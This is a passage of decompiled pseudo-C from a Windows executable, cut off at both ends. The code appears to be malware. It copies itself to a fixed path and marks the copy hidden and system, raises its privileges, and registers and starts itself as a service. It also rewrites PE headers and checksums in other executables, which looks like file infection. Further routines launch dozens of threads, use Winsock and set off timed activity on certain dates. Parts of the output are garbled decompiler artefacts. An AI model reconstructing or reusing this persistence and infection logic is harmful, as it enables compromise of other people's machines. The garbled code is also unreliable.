			*(fp - 1336) = fp - 0x1B;
			fn0040C5CC(fp - 0x04, dwArg00);
			*(fp - 0x053C) = fp - 0x0520;
			*(fp - 0x0540) = fp - 0x041C;
			word32 edi_108;
			fn00407370(dwArg00, out edi_108);
			*(fp - 0x0544) = 0x0040E044;
			*(fp - 0x0548) = fp - 0x041C;
			fn00407380(dwArg00);
			*(fp - 0x054C) = fp - 0x1C;
			*(fp - 0x0550) = fp - 0x041C;
			fn00407380(dwArg00);
			*(fp - 0x0554) = 4256220;
			*(fp - 0x0558) = fp - 0x041C;
			fn00407380(dwArg00);
			*(fp - 0x055C) = fp - 0x041C;
			int32 esi_129;
		} while (fn00403D58(dwArg00, out esi_129) == 0x00 || esi_129 >= ~0x08);
		*(fp - 0x0528) = fp - 0x1C;
		*(fp - 0x052C) = 4790644;
		fn00407380(dwArg00);
		*(fp - 0x0530) = fp - 0x041C;
		*(fp - 1332) = 4791164;
		word32 edi_146;
		fn00407370(dwArg00, out edi_146);
	}
	*(fp - 1316) = 0x01;
	return ebx;
}

// 00404AFC: Register word32 fn00404AFC(Register ptr32 ebp, Register out ptr32 ediOut)
word32 fn00404AFC(ptr32 ebp, ptr32 & ediOut)
{
	Eq_5457 (* edi_16)[];
	fn00407370(fp - 0x0310, out edi_16);
	Eq_11 ecx_22 = *(fp - 0x041C);
	*(fp - 0x041C) = 0x0104;
	*(fp - 0x0420) = fp - 0x0108;
	*(fp - 0x0424) = 0x00;
	GetModuleFileNameA(*(fp - 0x0424), *(fp - 0x0420), *(fp - 0x041C));
	*(fp - 0x041C) = 0x00;
	*(fp - 0x0420) = 0x00;
	*(fp - 0x0424) = fp - 0x0414;
	*(fp - 0x0428) = 0x00;
	*(fp - 0x042C) = fp - 0x0310;
	Eq_11 ecx_49 = fn004074DB(ecx_22, fp - 0x04, edi_16, dwArg00, dwArg04);
	*(fp - 0x0430) = 0x00;
	*(fp - 0x0434) = 0x00;
	*(fp - 1080) = fp - 0x020C;
	*(fp - 0x043C) = 0x00;
	*(fp - 0x0440) = fp - 0x0108;
	Eq_11 ecx_62 = fn004074DB(ecx_49, fp - 0x04, edi_16, dwArg00, dwArg04);
	*(fp - 0x0444) = fp - 0x020C;
	*(fp - 0x0448) = fp - 0x0414;
	return 0x00 - (-fn0040C540(ecx_62, dwArg00, dwArg04) == 0x00) + 0x01;
}

// 00404B78: Register ui32 fn00404B78(Stack (ptr Eq_1699) dwArg04, Stack uint32 dwArg08)
ui32 fn00404B78(Eq_1699 * dwArg04, uint32 dwArg08)
{
	if (dwArg08 >= 0x44 && (dwArg04->b0000 == 77 && dwArg04->b0001 == 0x5A))
	{
		word32 * eax_41 = dwArg04 + (word32) dwArg04->w003C / 0x003E;
		uint32 edx_44 = eax_41 - dwArg04;
		if (edx_44 <= dwArg08 + ~0x03)
			return ~(0x00 - (0x4550 - *eax_41 == 0x00)) & edx_44;
	}
	return 0x00;
}

// 00404BB7: Register (ptr Eq_2776) fn00404BB7(Stack (ptr Eq_1699) dwArg04, Stack word32 dwArg08, Stack uint32 dwArg0C)
Eq_2776 * fn00404BB7(Eq_1699 * dwArg04, word32 dwArg08, uint32 dwArg0C)
{
	struct Eq_2776 * eax_39;
	ptr32 eax_23 = fn00404B78(dwArg04, dwArg0C);
	if (eax_23 != 0x00)
	{
		struct Eq_2790 * ecx_61 = dwArg04 + eax_23 / 0x0028;
		uint32 edx_65 = ecx_61->dw0074;
		if (edx_65 >= dwArg08)
		{
			uint32 ecx_69 = (word32) ecx_61->w0006;
			uint32 esi_70 = ecx_61->a0070[dwArg08].dw0000;
			uint32 edi_100 = 0x00;
			eax_39 = (struct Eq_2776 *) ((char *) (&ecx_61->dw0074 + 0x03 + (edx_65 * 0x08) / 0x0078) + 0x04);
			if (true)
			{
				do
				{
					if (eax_39 - dwArg04 >= dwArg0C + ~0x03)
						goto l00404C20;
					uint32 edx_88 = eax_39->dw0000;
					if (eax_39->dw0000 + edx_88 > esi_70 && edx_88 <= esi_70)
						break;
					eax_39 = eax_39 + 0x01;
					edi_100 = edi_100 + 0x01;
				} while (edi_100 < ecx_69);
				if (edi_100 < ecx_69)
					return eax_39;
			}
		}
	}
l00404C20:
	eax_39 = null;
	return eax_39;
}

// 00404E60: void fn00404E60(Register ptr32 ebp, Stack Eq_11 dwArg04, Stack Eq_11 dwArg08)
void fn00404E60(ptr32 ebp, Eq_11 dwArg04, Eq_11 dwArg08)
{
	fn0040174B();
	word32 ecx_28;
	struct Eq_1699 * eax_29 = fn0040174E(fp - 0x18, dwArg04, fp - 0x08, 0x00, out ecx_28);
	if (eax_29 == null)
		return;
	ptr32 eax_76 = fn00404B78(eax_29, dwLoc08);
	if (eax_76 != 0x00)
	{
		struct Eq_2864 * eax_138 = fn00404BB7(eax_29, 0x03, dwLoc08);
		if (eax_138 != null)
		{
			struct Eq_2871 * esi_145 = eax_29 + eax_76 / 0x0028;
			esi_145->dw008C = 0x10;
			uint32 ecx_149 = eax_138->dw0004;
			eax_138->dw0000 = 0x10;
			eax_138->dw0008 = 0x10;
			ui32 ecx_150 = ecx_149 + 0x10;
			if (((word16) (ecx_149 + 0x10) & 0x0FFF) != 0x00)
				ecx_150 = (ecx_149 + 0x10 >> 0x0C) + 0x01 << 0x0C;
			esi_145->dw0050 = ecx_150;
			word32 ecx_159 = eax_138->dw000C;
			uint32 edi_162 = eax_138->dw0008 + ecx_159;
			cui16 di_163 = (word16) edi_162;
			if (edi_162 < dwArg08)
				di_163 = (word16) dwArg08;
			Eq_11 eax_173 = eax_29 + ecx_159 / 0x0028;
			if (eax_173 - eax_29 < 0x10)
				fn00407310(eax_173, 0x00, 0x10);
			word32 eax_185 = esi_145->dw00EC;
			if (eax_185 != 0x00)
				esi_145->dw0028 = eax_185;
l00404F29:
			word32 edi_98;
			if (fn00401808(fp - 0x18, out edi_98) != 0x00)
			{
				*(fp - 0x28) = edi_98;
				*(fp - 44) = (union Eq_11 *) dwArg04;
				fn00403F63(dwArg00, dwArg04);
			}
			*(fp - 0x28) = (union Eq_11 *) dwArg04;
			fn00404FA3(dwArg00);
			return;
		}
	}
	goto l00404F29;
}

// 00404F50: Register uint32 fn00404F50(Stack (ptr Eq_1699) dwArg04, Stack ui32 dwArg08)
uint32 fn00404F50(Eq_1699 * dwArg04, ui32 dwArg08)
{
	uint32 ecx_11 = 0x00;
	uint32 dwLoc08_16 = 0x00;
	if (dwArg08 >> 0x01 != 0x00)
	{
		word16 * edx_43 = dwArg04;
		uint32 esi_47 = dwArg08 >> 0x01;
		do
		{
			uint32 ecx_53 = ecx_11 + (word32) (*edx_43);
			ecx_11 = (ecx_53 & 0xFFFF) + (ecx_53 >> 0x10);
			edx_43 = edx_43 + 0x01;
			esi_47 = esi_47 - 0x01;
		} while (esi_47 != 0x00);
		dwLoc08_16 = ecx_11;
	}
	uint32 eax_28 = ecx_11 >> 0x10;
	return DPB(eax_28, (word16) eax_28 + (word16) dwLoc08_16, 0) + dwArg08;
}

// 00404FA3: void fn00404FA3(Stack Eq_11 dwArg04)
void fn00404FA3(Eq_11 dwArg04)
{
	fn0040174B();
	word32 ecx_32;
	struct Eq_1699 * eax_33 = fn0040174E(fp - 0x18, dwArg04, fp - 0x08, 0x00, out ecx_32);
	if (eax_33 != null)
	{
		ptr32 eax_60 = fn00404B78(eax_33, dwLoc08 & 0x00);
		if (eax_60 != 0x00)
		{
			ui32 * esi_81 = eax_33 + (eax_60 + 88) / 0x0028;
			if (eax_33[(eax_60 + 88) / 0x0028] != 0x00)
			{
				*esi_81 = *esi_81 & 0x00;
				*esi_81 = fn00404F50(eax_33, dwLoc08 & 0x00);
			}
		}
		word32 edi_76;
		fn00401808(fp - 0x18, out edi_76);
	}
	return;
}

// 004052D3: void fn004052D3(Stack Eq_11 dwArg04, Stack Eq_11 dwArg08)
void fn004052D3(Eq_11 dwArg04, Eq_11 dwArg08)
{
	Eq_82 eax_17 = dwArg04;
	if (dwArg04 == null)
		eax_17 = GetCurrentProcess();
	if (OpenProcessToken(eax_17, 0x28, fp + 0x04) != 0x00)
	{
		if (LookupPrivilegeValueA(0x00, dwArg08, fp - 0x10) != 0x00)
		{
			AdjustTokenPrivileges(dwArg04, 0x00, fp - 0x24, 0x10, fp - 0x0664, fp - 0x14);
			if (GetLastError() == 0x00)
				AdjustTokenPrivileges(dwArg04, 0x00, fp - 0x0664, 0x10, null, null);
		}
		CloseHandle(dwArg04);
	}
	return;
}

// 004053AC: Register word32 fn004053AC(Register word32 ebp, Register out ptr32 ebxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn004053AC(word32 ebp, ptr32 & ebxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	fn00404687(0x01);
	fn00407310(0x00491D84, 0x00, 0x0104);
	fn00407310(4791424, 0x00, 0x0104);
	fn00407310(4791164, 0x00, 0x0104);
	fn00407310(4790904, 0x00, 0x0104);
	fn00407310(4790644, 0x00, 0x0104);
	fn00403529(0x0040E0D4, 0x1EAC, 0x0040E0D0, 0x00);
	word32 esi_80;
	ui32 edi_81;
	ui32 ebx_82 = fn00402642(0x00491E90, out esi_80, out edi_81);
	Eq_15 eax_84 = GetVersion();
	globals->dw491E98 = edi_81;
	globals->t491E88 = eax_84 & 0x80000000;
	GetVersionExA(fp - 0x98);
	if (dwLoc94 == 0x05 && dwLoc90 == ebx_82)
		globals->dw491E98 = ebx_82;
	word32 eax_111;
	byte * edi_97;
	word32 ebx_98 = fn004048CB(ebx_82, fp - 0x04, esi_80, out edi_97);
	*(fp - 0xAC) = 0x0007D000;
	byte * eax_103 = fn00407BAF(dwArg00);
	globals->ptr491970 = eax_103;
	if (eax_103 == edi_97)
		eax_111 = 0x00;
	else
	{
		*(fp - 0xAC) = 0x0007D000;
		*(fp - 0xB0) = (byte **) edi_97;
		*(fp - 0xB4) = (byte **) eax_103;
		fn00407310(dwArg00, bArg04, dwArg08);
		word32 ebp_139;
		word32 edi_140;
		word32 ebx_141 = fn0040556C(ebx_98, out ebp_139, out edi_140);
		*(fp - 0xB8) = ebx_141;
		*(fp - 188) = 0x0040FDE0;
		*(fp - 0xC0) = (union Eq_15 *) fn00403434(dwArg00, dwArg04);
		*(fp - 0xC4) = edi_140;
		fn004052D3(dwArg00, dwArg04);
		eax_111 = ebx_141;
	}
	word32 edi_116;
	*ediOut = *(fp - 0xA8);
	word32 esi_118;
	*esiOut = *(fp - 0xA4);
	word32 ebx_120;
	*ebxOut = *(fp - 0xA0);
	return eax_111;
}

// 004054B3: void fn004054B3(Register ptr32 ebp, Stack Eq_11 dwArg04, Stack Eq_11 dwArg08)
void fn004054B3(ptr32 ebp, Eq_11 dwArg04, Eq_11 dwArg08)
{
	fn0040174B();
	ptr32 ebp_125 = fp - 0x04;
	word32 ecx_22;
	struct Eq_1699 * eax_23 = fn0040174E(fp - 0x18, dwArg04, fp - 0x08, 0x00, out ecx_22);
	if (eax_23 != null)
	{
		uint32 esi_134 = 0x1014;
		if (dwLoc08 >= 0x1000)
		{
			byte dl_103;
			Eq_15 eax_104 = fn00407460(dwArg08, out dl_103);
			if (dwLoc08 > 4294962200)
			{
				do
				{
					if (fn00408040(dwArg08, eax_23 + esi_134 / 0x0028, eax_104) == 0x00)
					{
						Eq_11 edi_153 = eax_23 + (esi_134 + 0x00) / 0x0028;
						fn00403529(edi_153, 0x1EAC, edi_153 - 0x04, SLICE(edi_153 - 0x04, byte, 24));
						word32 esi_172;
						word32 edi_173;
						ebp_125 = fn00407820(edi_153, (word32) dwArg08 + 0x0014, 0x1EAC, out esi_172, out edi_173);
						*(fp - 0x40) = edi_153 - 0x04;
						word32 edi_177;
						word32 esi_178 = fn00403496(esi_172, out edi_177);
						*(fp - 0x44) = edi_153 - 0x04;
						*(fp - 0x48) = esi_178;
						*(fp - 0x4C) = edi_177;
						fn004034CD(dwArg00, dwArg04, dwArg08, bArg0B);
						break;
					}
					esi_134 = esi_134 + 0x01;
				} while (esi_134 < dwLoc08 + ~0x03E7);
			}
			*(fp - 0x28) = 0x01;
		}
		word32 edi_89;
		fn00401808(ebp_125 - 0x14, out edi_89);
	}
	return;
}

// 0040556C: Register word32 fn0040556C(Register word32 ebx, Register out ptr32 ebpOut, Register out ptr32 ediOut)
word32 fn0040556C(word32 ebx, ptr32 & ebpOut, ptr32 & ediOut)
{
	Eq_34 eax_26 = LoadLibraryA(fn00403434(0x0040FB6F, 0x02));
	if (eax_26 != null)
	{
		globals->t491EA0 = GetProcAddress(eax_26, fn00403434(0x0040FC6F, 0x01));
		globals->t491E9C = GetProcAddress(eax_26, fn00403434(0x0040FC6F, 0x04));
		globals->t491EA4 = GetProcAddress(eax_26, fn00403434(0x0040FC6F, 0x05));
	}
	ptr32 esp_132;
	fn00403434(0x0040FB6F, 0x03);
	Eq_34 eax_51 = LoadLibraryA(*esp_43);
	if (eax_51 != null)
	{
		*(esp_132 - 0x04) = 0x03;
		*(esp_132 - 0x08) = 0x0040FC6F;
		Eq_15 eax_123 = fn00403434(dwArg00, dwArg04);
		*(esp_132 - 0x04) = (union Eq_15 *) eax_123;
		*(esp_132 - 0x08) = (HMODULE *) eax_51;
		word32 ebx_133;
		word32 ebp_134;
		word32 esi_135;
		word32 edi_136;
		word32 ecx_137;
		word32 eax_138;
		byte SZO_139;
		byte C_140;
		byte Z_141;
		esi_48();
		globals->dw491EA8 = eax_138;
	}
	word32 * esp_61 = esp_132 - 0x04;
	*esp_61 = 0x0040FDA4;
	word32 ebx_64;
	word32 ebp_65;
	<anonymous> * esi_66;
	word32 edi_67;
	word32 ecx_68;
	word32 eax_69;
	byte SZO_70;
	byte C_71;
	byte Z_72;
	word32 * esp_108;
	ebx_46();
	if (eax_69 != 0x00)
	{
		*(esp_108 - 0x04) = 0x01;
		*(esp_108 - 0x08) = 0x0040FDA4;
		Eq_15 eax_99 = fn00403434(dwArg00, dwArg04);
		*(esp_108 - 0x04) = (union Eq_15 *) eax_99;
		*(esp_108 - 0x08) = eax_69;
		word32 ebx_109;
		word32 ebp_110;
		word32 esi_111;
		word32 edi_112;
		word32 ecx_113;
		word32 eax_114;
		byte SZO_115;
		byte C_116;
		byte Z_117;
		esi_66();
		globals->dw491EAC = eax_114;
	}
	struct Eq_3540 * esp_84 = esp_108 + 0x01;
	word32 edi_83;
	*ediOut = *esp_108;
	word32 ebp_87;
	*ebpOut = esp_84->dw0004;
	return esp_84->dw0008;
}

// 004058B1: Register word32 fn004058B1(Register ptr32 ebp, Register (ptr (arr Eq_5457)) edi, Stack word32 dwArg04, Register out ptr32 ediOut)
word32 fn004058B1(ptr32 ebp, Eq_5457 * edi[], word32 dwArg04, ptr32 & ediOut)
{
	*ediOut = edi;
	word32 eax_162;
	fn0040174B();
	Eq_11 ecx_27;
	struct Eq_1699 * eax_28 = fn0040174E(fp - 0x1C, dwArg04, fp - 0x0C, 0x01, out ecx_27);
	if (eax_28 != null)
	{
		fn004074DB(ecx_27, fp - 0x04, edi, dwArg04, fp - 288);
		*(fp - 0x0344) = fp - 0x0224;
		*(fp - 0x0348) = fp - 288;
		fn00407380(dwArg00);
		*(fp - 844) = fp - 808;
		*(fp - 848) = fp - 288;
		fn00407380(dwArg00);
		*(fp - 0x0354) = 4256216;
		*(fp - 0x0358) = fp - 288;
		fn00407380(dwArg00);
		*(fp - 0x035C) = 4256220;
		*(fp - 0x0360) = fp - 288;
		fn00407380(dwArg00);
		*(fp - 868) = fp - 0x08;
		*(fp - 0x0368) = *(fp - 0x0C);
		*(fp - 0x036C) = (struct Eq_1699 **) eax_28;
		Eq_11 ebp_117;
		if (fn00407196(fp - 0x04, ebp, dwArg00, dwArg04, dwArg08, out ebp_117) != 0x00)
		{
			word32 edi_127;
			word32 esi_128 = fn00401808(ebp_117 - 0x18, out edi_127);
			*(fp - 0x0330) = *(ebp_117 - 0x04);
			*(fp - 0x0334) = esi_128;
			*(fp - 0x0338) = ebp_117 - 0x011C;
			fn00403CBB(dwArg00, dwArg04, dwArg08);
			*(fp - 0x033C) = esi_128;
			word32 edi_139;
			word32 ebp_140 = fn0040780B(ebp_117, dwArg00, out edi_139);
			*(fp - 0x0330) = (union Eq_11 *) GetCommandLineA();
			*(fp - 0x0334) = ebp_140 - 0x011C;
			word32 esi_142 = 0x00;
			word32 eax_151 = fn004046B3(dwArg00, dwArg04);
			if (eax_151 != 0x00)
			{
				*(fp - 0x0330) = ~0x00;
				*(fp - 0x0334) = eax_151;
				WaitForSingleObject(*(fp - 0x0334), *(fp - 0x0330));
				*(fp - 0x0330) = ebp_140 - 0x011C;
				fn00403DFA(dwArg00);
				*(fp - 0x0330) = 0x01;
				esi_142 = *(fp - 0x0330);
			}
			eax_162 = esi_142;
			return eax_162;
		}
		word32 edi_125;
		fn00401808(ebp_117 - 0x18, out edi_125);
	}
	eax_162 = 0x00;
	return eax_162;
}

// 00406820: Register word32 fn00406820(Register word32 ebx, Register word32 ebp, Register word32 esi, Register word32 edi, Register out ptr32 ediOut)
word32 fn00406820(word32 ebx, word32 ebp, word32 esi, word32 edi, ptr32 & ediOut)
{
	fn00407B80(0x1FC8, dwLoc04);
	GetModuleFileNameA(null, fp + 0x04, 0x0104);
	SetFileAttributesA(4791164, 0x20);
	Eq_92 eax_42 = CopyFileA(fp + 0x04, 4791164, 0x00);
	SetFileAttributesA(4791164, 0x20);
	word32 esi_28 = 4791164;
	ptr32 esp_312 = fp - 0x10;
	if (eax_42 != 0x00)
	{
		word32 edi_284;
		ptr32 ebp_285 = fn00407820(dwArg00, dwArg04, dwArg08, out esi_28, out edi_284);
		fn004054B3(ebp_285, dwArg00, dwArg04);
		fn00404E60(ebp_285, dwArg00, dwArg04);
		fn00404687(dwArg00);
		fn00403F63(dwArg00, dwArg04);
		esp_312 = fp - 0x14;
	}
	Eq_15 ebx_252;
	word32 esi_250;
	struct Eq_3884 * esp_258;
	union Eq_15 * esp_57 = esp_312 - 0x04;
	*esp_57 = 0x27;
	*(esp_57 - 0x04) = esi_28;
	SetFileAttributesA(*(esp_57 - 0x04), *esp_57);
	if (globals->t491E88 != ebx_252)
	{
		*(esp_258 - 0x04) = esi_250;
		*(esp_258 - 0x08) = 4790644;
		*(esp_258 - 0x0C) = 4790904;
		*(esp_258 - 0x10) = 0x80000002;
		fn0040451C(dwArg00, dwArg04, dwArg08, dwArg0C);
		*(esp_258 - 0x14) = 0x01;
		*(esp_258 - 0x18) = 0x0040FB6F;
		*(esp_258 - 0x04) = (union Eq_15 *) fn00403434(dwArg00, dwArg04);
		Eq_34 eax_232 = LoadLibraryA(*(esp_258 - 0x04));
		*(esp_258 - 0x04) = 0x0040FC6F;
		*(esp_258 - 0x08) = (HMODULE *) eax_232;
		Eq_34 ebp_234 = eax_232;
		Eq_15 eax_239 = GetProcAddress(*(esp_258 - 0x08), *(esp_258 - 0x04));
		struct Eq_3884 * esp_240 = esp_258;
		if (eax_239 != ebx_252)
		{
			*(esp_258 - 0x04) = 0x01;
			*(esp_258 - 0x08) = (union Eq_15 *) ebx_252;
			eax_239();
			esp_240 = esp_258 - 0x08;
		}
		HMODULE * esp_255 = esp_240 - 0x04;
		*esp_255 = (HMODULE *) ebp_234;
		FreeLibrary(*esp_255);
		esp_258 = (struct Eq_3884 *) ((char *) esp_255 + 0x04);
	}
	if (esp_258->t0010 != ebx_252)
	{
		if (globals->t491E88 != ebx_252)
		{
			union Eq_15 * esp_123 = esp_258 - 0x04;
			*esp_123 = (union Eq_15 *) ebx_252;
			*(esp_123 - 0x04) = esi_250;
			fn004046B3(dwArg00, dwArg04);
		}
		else if (globals->t491E90 == ebx_252)
		{
			struct Eq_4074 * esp_137 = esp_258 - 0x04;
			esp_137->t0000.u0 = 0x02;
			*(esp_137 - 0x04) = (union Eq_15 *) ebx_252;
			*(esp_137 - 0x08) = (union Eq_15 *) ebx_252;
			Eq_15 eax_143 = OpenSCManagerA(*(esp_137 - 0x08), *(esp_137 - 0x04), esp_137->t0000);
			esp_137->t0000 = ebx_252;
			*(esp_137 - 0x04) = (union Eq_15 *) ebx_252;
			*(esp_137 - 0x08) = (union Eq_15 *) ebx_252;
			*(esp_137 - 0x0C) = (union Eq_15 *) ebx_252;
			*(esp_137 - 0x10) = (union Eq_15 *) ebx_252;
			*(esp_137 - 0x14) = esi_250;
			*(esp_137 - 0x18) = (union Eq_15 *) ebx_252;
			*(esp_137 - 0x1C) = 0x02;
			*(esp_137 - 0x20) = 0x0110;
			*(esp_137 - 0x24) = (union Eq_15 *) ebx_252;
			*(esp_137 - 0x28) = 4790644;
			*(esp_137 - 44) = 4790644;
			*(esp_137 - 0x30) = (union Eq_15 *) eax_143;
			esp_137->t0014 = eax_143;
			CreateServiceA(*(esp_137 - 0x30), *(esp_137 - 44), *(esp_137 - 0x28), *(esp_137 - 0x24), *(esp_137 - 0x20), *(esp_137 - 0x1C), *(esp_137 - 0x18), *(esp_137 - 0x14), *(esp_137 - 0x10), *(esp_137 - 0x0C), *(esp_137 - 0x08), *(esp_137 - 0x04), esp_137->t0000);
			esp_137->t0000 = esp_137->t0014;
			CloseServiceHandle(esp_137->t0000);
			esp_137->t0000.u0 = 0x01;
			*(esp_137 - 0x04) = (union Eq_15 *) ebx_252;
			*(esp_137 - 0x08) = (union Eq_15 *) ebx_252;
			Eq_15 eax_186 = OpenSCManagerA(*(esp_137 - 0x08), *(esp_137 - 0x04), esp_137->t0000);
			esp_137->t0000.u0 = 0x10;
			*(esp_137 - 0x04) = 4790644;
			*(esp_137 - 0x08) = (union Eq_15 *) eax_186;
			Eq_15 eax_195 = OpenServiceA(*(esp_137 - 0x08), *(esp_137 - 0x04), esp_137->t0000);
			esp_137->t0000 = ebx_252;
			*(esp_137 - 0x04) = (union Eq_15 *) ebx_252;
			*(esp_137 - 0x08) = (union Eq_15 *) eax_195;
			StartServiceA(*(esp_137 - 0x08), *(esp_137 - 0x04), esp_137->t0000);
			esp_137->t0000 = eax_195;
			CloseServiceHandle(esp_137->t0000);
			esp_137->t0000 = eax_186;
			CloseServiceHandle(esp_137->t0000);
		}
		*(esp_258 - 0x04) = 0x01;
	}
	word32 edi_96;
	*ediOut = esp_258->dw0000;
	return esp_258->dw0008;
}

// 00406D5E: Register word32 fn00406D5E(Register word32 ebp, Register word32 esi, Register out ptr32 ebpOut)
word32 fn00406D5E(word32 ebp, word32 esi, ptr32 & ebpOut)
{
	*ebpOut = ebp;
	word32 esi_21 = 0x01;
	do
	{
		*(fp - 0x08) = 0x01;
		*(fp - 0x0C) = esi_21;
		int32 esi_18;
		word32 ebx_19 = fn004013FA(ebp, esi_21, dwArg00, dwArg04, out esi_18);
		esi_21 = esi_18 + 0x01;
	} while (esi_18 < ~0x0BB6);
	return ebx_19;
}

// 00406D75: void fn00406D75()
void fn00406D75()
{
	ptr32 ebp_104 = fp - 0x04;
	void (* edi_108)(Eq_15) = Sleep;
	ui32 ebx_106 = 0x01;
	byte bl_111 = 0x01;
	word16 bx_116 = 0x01;
	ptr32 esp_103 = fp - 0x24;
	while (true)
	{
		union Eq_15 * esp_34 = esp_120 - 0x04;
		*esp_34 = 600000;
		Sleep(*esp_34);
		*esp_34 = (union Eq_15 *) (ebp_104 - 0x14);
		GetLocalTime(*esp_34);
		word16 ax_41 = *(ebp_104 - 0x12);
		esp_103 = (char *) esp_34 + 0x04;
		byte al_43 = (byte) ax_41;
		ptr32 esp_120 = esp_103;
		if ((bl_111 & al_43) != 0x00)
		{
			ptr32 esp_121 = esp_103;
			if (*(ebp_104 - 0x0E) == 0x06)
			{
				globals->dw491E94 = globals->dw491E94 & 0x00;
				globals->dw491E98 = ebx_106;
				if (ax_41 == 0x07)
					globals->dw491E94 = ebx_106;
				if (ax_41 == bx_116)
					globals->dw491E94 = ebx_106;
				int32 esi_57 = 0x00;
				do
				{
					LPDWORD * esp_63 = esp_120 - 0x04;
					*esp_63 = (LPDWORD *) (ebp_104 - 0x04);
					*(esp_63 - 0x04) = 0x00;
					*(esp_63 - 0x08) = esi_57;
					*(esp_63 - 0x0C) = 4222236;
					*(esp_63 - 0x10) = 0x00;
					*(esp_63 - 0x14) = 0x00;
					Eq_82 eax_75 = CreateThread(*(esp_63 - 0x14), *(esp_63 - 0x10), *(esp_63 - 0x0C), *(esp_63 - 0x08), *(esp_63 - 0x04), *esp_63);
					esi_57 = esi_57 + 0x01;
				} while (esi_57 < 0x1A);
				*esp_63 = (LPDWORD *) (DWORD *) 1800000;
				ptr32 esp_82;
				word32 ebp_83;
				byte SCZO_84;
				word32 ebx_85;
				word32 esi_86;
				<anonymous> * edi_87;
				word32 eax_88;
				word16 ax_89;
				byte bl_90;
				byte al_91;
				byte SZO_92;
				byte C_93;
				byte Z_94;
				word16 bx_95;
				byte SO_96;
				edi_108();
				word32 ebp_97;
				word32 ebx_98 = fn00406D5E(ebp_83, esi_86, out ebp_97);
				*(esp_82 - 0x04) = ~0x00;
				byte SCZO_105;
				word32 esi_107;
				word32 eax_109;
				word16 ax_110;
				byte al_112;
				byte SZO_113;
				byte C_114;
				byte Z_115;
				byte SO_117;
				edi_87();
			}
		}
	}
}

// 00406F1C: void fn00406F1C()
void fn00406F1C()
{
	CreateThread(null, 0x00, &globals->t4015FF, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t406083, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t406801, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t405DFA, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t406DFB, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t4069F1, 0x00, 0x00, fp - 0x08);
	Eq_261 ebx_110 = 0x00;
	do
	{
		CreateThread(null, 0x00, &globals->t4069A4, ebx_110, 0x00, fp - 0x08);
		ebx_110 = ebx_110 + 0x01;
	} while (ebx_110 < 0x1A);
	fn00406D75();
	return;
}

// 0040700C: Register word32 fn0040700C(Register ptr32 ebp, Register out ptr32 ediOut)
word32 fn0040700C(ptr32 ebp, ptr32 & ediOut)
{
	ptr32 esp_13;
	word32 ebp_14;
	byte SCZO_15;
	word32 eax_16;
	byte SZO_17;
	byte C_18;
	byte Z_19;
	word32 ecx_20;
	word32 edi_21;
	word32 ebx_22;
	word32 esi_23;
	WS2_32.dll!Ordinal_115();
	word32 ebx_24;
	word32 esi_25;
	word32 edi_26;
	if (fn004053AC(ebp_14, out ebx_24, out esi_25, out edi_26) != 0x00)
	{
		Eq_5457 (* edi_44)[];
		ptr32 ebp_45 = fn00406820(ebx_24, ebp_14, esi_25, edi_26, out edi_44);
		if (globals->b40F0D4 != 0x00)
		{
			*(esp_13 - 0x04) = 0x0040F0D4;
			word32 edi_79;
			if (fn004058B1(ebp_45, edi_44, dwArg00, out edi_79) != 0x00)
				return 0x00;
		}
		if (globals->t491E90 != 0x00)
		{
			*(ebp_45 - 0x08) = *(ebp_45 - 0x08) & 0x00;
			*(ebp_45 - 0x04) = *(ebp_45 - 0x04) & 0x00;
			*(ebp_45 - 0x10) = 4790644;
			*(esp_13 - 0x04) = ebp_45 - 0x10;
			*(ebp_45 - 0x0C) = 4222957;
			StartServiceCtrlDispatcherA(*(esp_13 - 0x04));
		}
		word32 edi_57;
		if (fn00404AFC(ebp_45, out edi_57) != 0x00)
			fn00406F1C();
	}
	return 0x00;
}

// 00407196: Register (ptr byte) fn00407196(Register (ptr word32) ebp, Stack ptr32 dwArg00, Stack Eq_11 dwArg04, Stack Eq_11 dwArg08, Stack word32 dwArg0C, Register out ptr32 ebpOut)
byte * fn00407196(word32 * ebp, ptr32 dwArg00, Eq_11 dwArg04, Eq_11 dwArg08, word32 dwArg0C, ptr32 & ebpOut)
{
	byte * eax_107;
	ui32 eax_19 = *dwArg04;
	Eq_11 edx_185 = 0x00;
	uint32 dwLoc08_195 = 0x00;
	if (dwArg08 < (eax_19 << 0x03) + 0x04)
		eax_107 = null;
	else
	{
		if (true)
		{
			struct Eq_4832 * esi_188 = dwArg04 + 0x01 + 0x01;
			ui32 dwArg04_189 = eax_19;
			do
			{
				Eq_11 ecx_199 = esi_188->dw0000;
				if (edx_185 < ecx_199)
				{
					word32 ecx_222 = ecx_199 - edx_185;
					edx_185 = (word32) edx_185 + ecx_222;
					dwLoc08_195 = dwLoc08_195 + ecx_222;
				}
				word32 eax_207 = esi_188->dw0000;
				if (true)
					edx_185 = (word32) edx_185 + eax_207;
				ui32 v15_215 = dwArg04_189 - 0x01;
				esi_188 = esi_188 + 0x01;
				dwArg04_189 = v15_215;
			} while (v15_215 != 0x00);
		}
		uint32 eax_83 = dwArg08 - (eax_19 << 0x03);
		uint32 eax_89 = eax_83 + ~0x03 - (eax_19 << 0x03);
		if (dwLoc08_195 < eax_89 + ~0x03)
		{
			uint32 eax_182 = eax_89 + ~0x03 - dwLoc08_195;
			edx_185 = (word32) edx_185 + eax_182 + (eax_182 - dwLoc08_195);
		}
		*dwArg0C = (union Eq_11 *) edx_185;
		byte * esi_121 = null;
		Eq_4914 dwLoc08_101[] = dwLoc08_195 & 0x00;
		eax_107 = fn00407BAF(edx_185);
		int32 edi_108 = dwArg04 + ((eax_19 << 0x03) + 0x04);
		ui32 ebx_109 = eax_19;
		if (true)
		{
			struct Eq_4889 * ecx_140 = dwArg04 + 0x01;
			do
			{
				while (esi_121 < ecx_140->dw0000)
				{
					Mem154[eax_107 + esi_121:byte] = Mem106[dwLoc08_101 + edi_108:byte];
					esi_121 = esi_121 + 0x01;
					dwLoc08_101 = (Eq_4914 (*)[]) (dwLoc08_101 + 0x01)->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000;
				}
				uint32 edx_159 = 0x00;
